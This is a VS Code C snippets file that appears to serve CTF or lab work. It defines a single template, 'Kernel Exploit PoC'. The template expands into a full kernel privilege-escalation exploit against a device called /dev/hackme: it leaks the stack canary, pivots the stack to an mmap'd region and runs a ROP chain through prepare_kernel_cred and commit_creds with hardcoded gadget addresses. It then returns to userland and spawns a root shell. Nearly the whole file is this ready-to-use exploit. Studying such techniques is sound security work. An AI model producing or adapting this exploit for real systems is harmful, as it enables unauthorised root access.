{
	// Place your snippets for c here. Each snippet is defined under a snippet name and has a prefix, body and 
	// description. The prefix is what is used to trigger the snippet and the body will be expanded and inserted. Possible variables are:
	// $1, $2 for tab stops, $0 for the final cursor position, and ${1:label}, ${2:another} for placeholders. Placeholders with the 
	// same ids are connected.
	// Example:
	// "Print to console": {
	// 	"prefix": "log",
	// 	"body": [
	// 		"console.log('$1');",
	// 		"$2"
	// 	],
	// 	"description": "Log output to console"
	// }
  "Kernel Exploit PoC": {
    "prefix": "kpwn",
    "body": [
      "#include <unistd.h>",
      "#include <fcntl.h>",
      "#include <sys/mman.h>",
      "",
      "#include <stdio.h>",
      "#include <stdlib.h>",
      "#include <stdint.h>",
      "",
      "",
      "#define DEV_NAME \"/dev/hackme\"",
      "int g_fd;",
      "",
      "void get_shell()",
      "{",
      "    puts(\"[*] Get shell.\");",
      "    // use execve to spawn a shell",
      "    char *argv[] = {\"/bin/sh\", NULL};",
      "    char *envp[] = {NULL};",
      "    execve(argv[0], argv, envp);",
      "    perror(\"[-] execve failed.\\n\");",
      "    exit(-1);",
      "}",
      "",
      "void open_dev(void)",
      "{",
      "    g_fd = open(DEV_NAME, O_RDWR);",
      "    if (g_fd < 0) {",
      "        perror(\"[-] Open \" DEV_NAME \" failed.\\n\");",
      "        exit(-1);",
      "    }",
      "    puts(\"[*] Open \" DEV_NAME \" success.\");",
      "}",
      "",
      "uint64_t g_usr_ip = (uint64_t)get_shell;",
      "uint64_t g_usr_cs, g_usr_ss, g_usr_sp, g_usr_rflags;",
      "void save_usr_state(void)",
      "{",
      "    __asm__ volatile(",
      "        \".intel_syntax noprefix;\"",
      "        \"mov g_usr_cs, cs;\"",
      "        \"mov g_usr_ss, ss;\"",
      "        \"mov g_usr_sp, rsp;\"",
      "        \"pushfq;\"",
      "        \"pop g_usr_rflags;\"",
      "        \".att_syntax;\"",
      "    );",
      "    puts(\"[*] Save user state.\");",
      "}",
      "",
      "uint64_t canary;",
      "void leak_canary(void)",
      "{",
      "    uint64_t off = 16;",
      "    uint64_t buf[20] = {0};",
      "    ssize_t ret = read(g_fd, buf, sizeof(buf));",
      "    if (ret < 0) {",
      "        perror(\"[-] Read failed.\\n\");",
      "        exit(-1);",
      "    }",
      "    canary = buf[off];",
      "    printf(\"[*] Leak canary: 0x%lx\\n\", canary);",
      "}",
      "",
      "// gadgets",
      "uint64_t g_prepare_kernel_cred = 0xffffffff814c67f0;",
      "uint64_t g_commit_creds = 0xffffffff814c6410;",
      "// 0xffffffff81006370 : pop rdi ; ret",
      "uint64_t g_pop_rdi = 0xffffffff81006370;",
      "// 0xffffffff8150b97e : pop rsi ; ret",
      "uint64_t g_pop_rsi =  0xffffffff8150b97e;",
      "// 0xffffffff815f4bbc : pop rcx ; ret",
      "uint64_t g_pop_rcx = 0xffffffff815f4bbc;",
      "// 0xffffffff818c6ebb : cmp ecx, esi ; mov rdi, rax ; ja 0xffffffff818c6ead ; pop rbp ; ret",
      "uint64_t g_mov_rdi_rax_pop_rbp = 0xffffffff818c6ebb;",
      "// 0xffffffff8100a55f : swapgs ; pop rbp ; ret",
      "uint64_t g_swapgs_pop_rbp = 0xffffffff8100a55f;",
      "// 0xffffffff8100c0d9 : iretq",
      "uint64_t g_iretq = 0xffffffff8100c0d9;",
      "",
      "// 0xffffffff8196f56a : mov esp, 0x5b000000 ; pop r12 ; pop rbp ; ret ",
      "uint64_t g_pivot_stack = 0xffffffff8196f56a;",
      "uint64_t *g_new_stk_base = (uint64_t*)0x5b000000;",
      "",
      "void alloc_new_stack(void)",
      "{",
      "    uint64_t *buf = (uint64_t*)mmap((void*)g_new_stk_base - 0x1000, 0x2000, PROT_EXEC | PROT_READ | PROT_WRITE,",
      "                                     MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);",
      "    printf(\"[*] mmap buf: 0x%lx\\n\", (uint64_t)buf);",
      "    if (buf == MAP_FAILED) {",
      "        perror(\"[-] mmap failed.\\n\");",
      "        exit(-1);",
      "    }",
      "    buf[0] = 0; // make sure the phisical page is allocated.",
      "    uint64_t *p = g_new_stk_base; // reserve the 1st page for internal function call.",
      "    *p++ = 0; // r12 for pivot stack",
      "    *p++ = 0; // rbp for pivot stack",
      "    *p++ = g_pop_rdi;",
      "    *p++ = 0;",
      "    *p++ = g_prepare_kernel_cred; // prepare_kernel_cred(0);",
      "    *p++ = g_pop_rcx;",
      "    *p++ = 0;",
      "    *p++ = g_pop_rsi;",
      "    *p++ = 0;",
      "    *p++ = g_mov_rdi_rax_pop_rbp;",
      "    *p++ = 0; // rbp",
      "    *p++ = g_commit_creds; // commit_creds(rax);",
      "    *p++ = g_swapgs_pop_rbp; // swapgs; pop rbp;",
      "    *p++ = 0; // rbp",
      "    *p++ = g_iretq; // iretq",
      "    *p++ = g_usr_ip;",
      "    *p++ = g_usr_cs;",
      "    *p++ = g_usr_rflags;",
      "    *p++ = g_usr_sp;",
      "    *p++ = g_usr_ss;",
      "}",
      "",
      "void overflow(void)",
      "{",
      "    uint64_t off = 16;",
      "    uint64_t buf[0x20] = {0};",
      "    uint64_t *p = buf + off;",
      "    *p++ = canary; // canary",
      "    *p++ = 0; // dummy rbx",
      "    *p++ = 0; // dummy r12",
      "    *p++ = 0; // dummy rbp",
      "    *p++ = g_pivot_stack; // return to stack pivot",
      "    ssize_t ret = write(g_fd, buf, sizeof(buf));",
      "    if (ret < 0) {",
      "        perror(\"[-] Write failed.\\n\");",
      "        exit(-1);",
      "    }",
      "    puts(\"[*] Should never be here.\");",
      "}",
      "",
      "int main()",
      "{",
      "    printf(\"get_shell: 0x%lx\\n\", (uint64_t)get_shell);",
      "    save_usr_state();",
      "    open_dev();",
      "    leak_canary();",
      "    alloc_new_stack();",
      "    overflow();",
      "    return 0;",
      "}"
    ],
    "description": "A basic Kernel Exploit Proof of Concept template."
  }
}